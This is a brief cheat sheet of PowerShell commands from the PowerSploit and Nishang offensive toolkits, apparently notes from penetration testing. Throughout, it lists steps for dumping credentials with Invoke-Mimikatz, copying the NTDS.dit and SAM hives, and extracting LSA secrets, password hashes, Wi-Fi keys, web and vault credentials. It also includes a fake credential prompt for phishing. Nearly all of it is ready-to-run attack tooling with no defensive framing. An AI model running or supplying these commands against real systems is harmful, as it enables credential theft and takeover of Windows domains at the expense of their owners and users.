
**`Powersploit`**
Local user Hash :
`PS > cd \PowerSploit-master\PowerSploit-master\Exfiltration
`PS > ipmo Invoke-Mimikatz.ps1
`PS > Invoke-Mimikatz -DumpCreds
`PS > Invoke-Mimikatz -DumpCerts
`NTDS.dit` and `SAM` Hive :
`PS > . .\PowerSploit-master\PowerSploit-master\Exfiltration\Invoke-NinjaCopy.ps1
`PS > get-help Invoke-NinjaCopy -Examples
Vault Credential :
`PS > . .\PowerSploit-master\PowerSploit-master\Exfiltration\Get-VaultCredential.ps1

permission Check Automation with **`PowerSploit`**
resource: https://github.com/PowerShellMafia/PowerSploit 

**`Nishang`**
`PS > ipmo nishang\Gather\Get-LSASecret.ps1
`PS > ipmo nishang\Escalation\Enable-DuplicateToken.ps1
`PS > Enable-DuplicateToken
`PS > Get-LSASecret
local user hash : 
`PS > nishang\Gather\Get-PassHashes.ps1
`PS > Get-PassHashes
wireless :
`PS > . .\nishang\Gather\Get-WLAN-Keys.ps1
`PS > Get-WLAN-Keys
phishing : 
`PS > . .\nishang\Gather\Invoke-CredentialsPhish.ps1
`PS > Invoke-CredentialsPhish
`NTDS.dit` and `SAM` Hive :
`PS > . .\nishang\Gather\Copy-VSS.ps1
`PS > Copy-VSS -Path C:\pfpt\ 
Web Credential : 
`PS > . .\nishang\Gather\Get-WebCredentials.ps1
`PS > Get-WebCredentials
Vault Credential 
